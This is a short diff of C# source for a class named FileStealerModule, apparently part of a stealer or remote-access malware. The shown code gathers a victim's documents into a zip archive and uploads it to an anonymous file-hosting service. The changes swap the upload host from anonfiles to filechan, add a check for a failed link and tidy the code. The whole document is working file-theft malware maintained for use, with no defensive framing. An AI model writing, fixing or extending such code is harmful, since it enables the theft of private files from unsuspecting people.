@@ -62,7 +62,7 @@ public sealed class FileStealerModule : ModuleBase
         var form = new MultipartFormDataContent();
         form.Add(new StreamContent(f), "file", filename);
 
-        var res = await HttpClient.PostAsync("https://api.anonfiles.com/upload", form);
+        var res = await HttpClient.PostAsync("https://api.filechan.org/upload", form);
         var resp = await res.Content.ReadFromJsonAsync<JsonDocument>();
 
         if (!resp!.RootElement.GetProperty("status").GetBoolean())
@@ -70,7 +70,11 @@ public sealed class FileStealerModule : ModuleBase
             return null;
         }
 
-        return resp.RootElement.GetProperty("data").GetProperty("file").GetProperty("url").GetProperty("short")
+        return resp.RootElement
+                   .GetProperty("data")
+                   .GetProperty("file")
+                   .GetProperty("url")
+                   .GetProperty("short")
                    .GetString();
     }
 
@@ -90,7 +94,7 @@ public sealed class FileStealerModule : ModuleBase
 
         foreach (var doc in docs)
         {
-            Debug.WriteLine("Processing {0}", doc.FullName);
+            Debug.WriteLine("Processing {0}", (object)doc.FullName);
 
             var entry = zip.CreateEntry(Guid.NewGuid() + "_" + doc.Name);
             await using var entryStream = entry.Open();
@@ -102,6 +106,11 @@ public sealed class FileStealerModule : ModuleBase
         ms.Position = 0;
 
         var url = await UploadFile(ms, "docs.zip");
+
+        if (string.IsNullOrWhiteSpace(url))
+        {
+            throw new Exception("Unable to generate link");
+        }
 
         return new ExecutionResult
         {
